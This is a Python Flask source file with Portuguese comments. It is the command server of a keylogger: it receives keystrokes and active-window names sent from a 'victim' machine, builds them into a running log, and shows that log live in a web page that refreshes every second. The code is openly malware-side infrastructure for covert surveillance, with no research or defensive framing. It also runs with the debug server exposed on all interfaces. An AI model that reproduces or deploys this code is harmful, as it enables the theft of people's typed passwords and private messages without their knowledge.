from flask import Flask, request, render_template_string, jsonify  # Importa o Flask para criar o servidor web e manipular requisições

app = Flask(__name__)  # Inicializa a aplicação Flask

# Variáveis globais para armazenar as teclas pressionadas e a janela ativa
log_teclas = ""  # String para armazenar o log de teclas
janela_atual = "Desconhecido"  # Armazena o nome da janela ativa

# Template HTML para exibir os logs de teclas e a janela ativa no navegador
html_template = """
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <title>Keylogger</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        #log { white-space: pre-wrap; background: #f4f4f4; padding: 10px; border-radius: 5px; }
        #janela { font-weight: bold; color: red; }
    </style>
    <script>
        function atualizarLog() {
            fetch('/ver')
                .then(response => response.text())
                .then(data => { document.getElementById('log').innerText = data; });
        }
        function atualizarJanela() {
            fetch('/janela')
                .then(response => response.text())
                .then(data => { document.getElementById('janela').innerText = data; });
        }
        setInterval(atualizarLog, 1000);
        setInterval(atualizarJanela, 1000);
    </script>
</head>
<body>
    <h1>Monitoramento de Teclas</h1>
    <p>Aplicação ou site ativo: <span id="janela"></span></p>
    <div id="log">Aguardando teclas...</div>
</body>
</html>
"""

@app.route("/")
def index():
    """Rota principal que renderiza o template HTML."""
    return render_template_string(html_template)

@app.route("/log", methods=["POST"])
def receber_tecla():
    """Rota para receber dados de teclas pressionadas enviados pela vítima."""
    global log_teclas, janela_atual
    try:
        data = request.json  # Obtém os dados da requisição POST no formato JSON
        tecla = data.get("tecla", "")  # Obtém a tecla pressionada
        janela = data.get("janela", "Desconhecido")  # Obtém a janela ativa

        # Verifica se houve mudança de janela
        if janela != janela_atual:
            log_teclas += f"\n\n🔴 [A vítima mudou para: {janela}]\n"
            janela_atual = janela

        # Registra a tecla pressionada no log de teclas
        if tecla == "\b":  # Se a tecla for backspace
            log_teclas = log_teclas[:-1]  # Remove o último caractere do log
        else:
            log_teclas += tecla  # Adiciona a tecla ao log

        print(f"Tecla recebida: {tecla}")

        return jsonify({"status": "success", "message": "Tecla registrada"}), 200  # Retorna uma resposta de sucesso

    except Exception as e:
        print(f"Erro ao registrar tecla: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500  # Retorna uma resposta de erro

@app.route("/ver")
def ver_log():
    """Rota para visualizar o log de teclas."""
    return log_teclas

@app.route("/janela")
def ver_janela():
    """Rota para visualizar a janela ativa."""
    return janela_atual

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)  # Inicia o servidor Flask para rodar localmente na porta 5000